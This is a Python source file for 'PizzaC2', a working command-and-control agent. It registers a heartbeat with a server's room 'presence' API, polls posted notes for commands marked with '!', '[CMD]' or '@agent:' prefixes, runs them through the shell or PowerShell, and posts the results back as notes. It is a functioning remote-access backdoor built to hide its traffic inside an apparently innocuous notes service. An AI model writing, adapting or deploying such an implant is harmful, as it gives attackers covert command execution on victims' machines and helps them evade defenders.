#!/usr/bin/env python3
"""
PizzaC2 - Cross-Platform Target Agent (Python 3)
LOTS (Living Off Trusted Sites) C2 Agent
Requires only Python standard library (no pip packages needed)
"""

import json
import os
import platform
import re
import socket
import subprocess
import sys
import time
import urllib.parse
import urllib.request

SERVER_URL = "http://127.0.0.1:8080"
ROOM_CODE = "123456"
POLL_INTERVAL = 3

HOSTNAME = socket.gethostname()
USERNAME = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
SYSTEM_OS = platform.system()
AGENT_ID = f"Agent-{HOSTNAME}-{int(time.time()) % 10000}"
AGENT_NAME = f"🤖 Agent-{HOSTNAME} ({USERNAME})"

print(f"""
===================================================================
  ____  _                 ____ ____       _                    _   
 |  _ \(_)___________ _  / ___|___ \     / \   __ _  ___ _ __ | |_ 
 | |_) | |_  /_  / _` | | |     __) |   / _ \ / _` |/ _ \ '_ \| __|
 |  __/| |/ / / / (_| | | |___ / __/   / ___ \ (_| |  __/ | | | |_ 
 |_|   |_/___/___\__,_|  \____|_____| /_/   \_\__, |\___|_| |_|\__|
                                              |___/ (Python)       
===================================================================
[*] PizzaC2 Target Agent Running
[*] Server:   {SERVER_URL}
[*] Room:     {ROOM_CODE}
[*] Host:     {HOSTNAME} ({SYSTEM_OS})
[*] Agent ID: {AGENT_ID}
===================================================================
""")


def http_post(url, data):
    try:
        body = json.dumps(data).encode("utf-8")
        req = urllib.request.Request(
            url,
            data=body,
            headers={"Content-Type": "application/json; charset=utf-8"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception:
        return None


def http_get(url):
    try:
        req = urllib.request.Request(url, headers={"Accept": "application/json"})
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception:
        return None


def heartbeat():
    url = f"{SERVER_URL}/api/rooms/{ROOM_CODE}/presence"
    data = {
        "id": AGENT_ID,
        "name": AGENT_NAME,
        "isAgent": True,
        "isHost": False,
    }
    return http_post(url, data)


def run_command(cmd_str):
    try:
        if platform.system() == "Windows":
            res = subprocess.run(
                ["powershell", "-NoProfile", "-Command", cmd_str],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                timeout=25,
            )
        else:
            res = subprocess.run(
                cmd_str,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                timeout=25,
            )
        output = res.stdout.strip() if res.stdout else "(Command executed with no output)"
    except subprocess.TimeoutExpired:
        output = "Error: Command timed out (25s)"
    except Exception as e:
        output = f"Execution error: {e}"

    if len(output) > 1200:
        output = output[:1150] + f"\n... [Truncated, {len(output)} chars total]"
    return output


def main():
    notes_url = f"{SERVER_URL}/api/rooms/{ROOM_CODE}/notes"
    executed_ids = set()

    # Pre-populate existing notes
    init_data = http_get(notes_url)
    if init_data and "notes" in init_data:
        for n in init_data["notes"]:
            if "id" in n:
                executed_ids.add(str(n["id"]))

    heartbeat()
    print(f"[+] Heartbeat registered in room {ROOM_CODE}")

    last_hb = time.time()
    poll_sec = POLL_INTERVAL

    while True:
        try:
            now = time.time()
            if now - last_hb > 5:
                heartbeat()
                last_hb = now

            data = http_get(notes_url)
            if data and "notes" in data:
                for note in data["notes"]:
                    nid = str(note.get("id", ""))
                    if not nid or nid in executed_ids:
                        continue
                    executed_ids.add(nid)

                    text = str(note.get("text", "")).strip()
                    if not text or text.startswith("[RES]") or text.startswith("[OUTPUT]"):
                        continue

                    raw_cmd = None
                    if text.startswith("!"):
                        raw_cmd = text[1:].strip()
                    elif text.startswith("[CMD]"):
                        raw_cmd = text[5:].strip()
                    elif m := re.match(r"^@(\S+):\s*(.+)$", text):
                        target, candidate = m.group(1), m.group(2).strip()
                        if target in ("all", AGENT_ID) or target in AGENT_NAME:
                            raw_cmd = candidate[1:].strip() if candidate.startswith("!") else candidate
                    elif m := re.search(r"\[c:\s*([^\]]+)\]", text):
                        raw_cmd = m.group(1).strip()

                    if not raw_cmd:
                        continue

                    num = note.get("number", "?")
                    print(f"\033[95m[!] >>> Received C2 Command: '{raw_cmd}' (Sticker #{num})\033[0m")

                    if raw_cmd.startswith("sleep "):
                        try:
                            poll_sec = int(raw_cmd.split()[1])
                            res_txt = f"[RES] #{num} (sleep)\nPoll interval updated to {poll_sec}s"
                            http_post(notes_url, {"author": AGENT_NAME, "text": res_txt})
                            continue
                        except Exception:
                            pass

                    if raw_cmd in ("exit", "kill"):
                        res_txt = f"[RES] #{num} (exit)\nAgent terminating. Goodbye!"
                        http_post(notes_url, {"author": AGENT_NAME, "text": res_txt})
                        print("[*] Terminated by operator.")
                        sys.exit(0)

                    output = run_command(raw_cmd)
                    res_txt = f"[RES] #{num} ({raw_cmd})\n{output}"
                    http_post(notes_url, {"author": AGENT_NAME, "text": res_txt})
                    print(f"\033[96m[+] Result for sticker #{num} posted!\033[0m")

        except Exception:
            pass

        time.sleep(poll_sec)


if __name__ == "__main__":
    main()
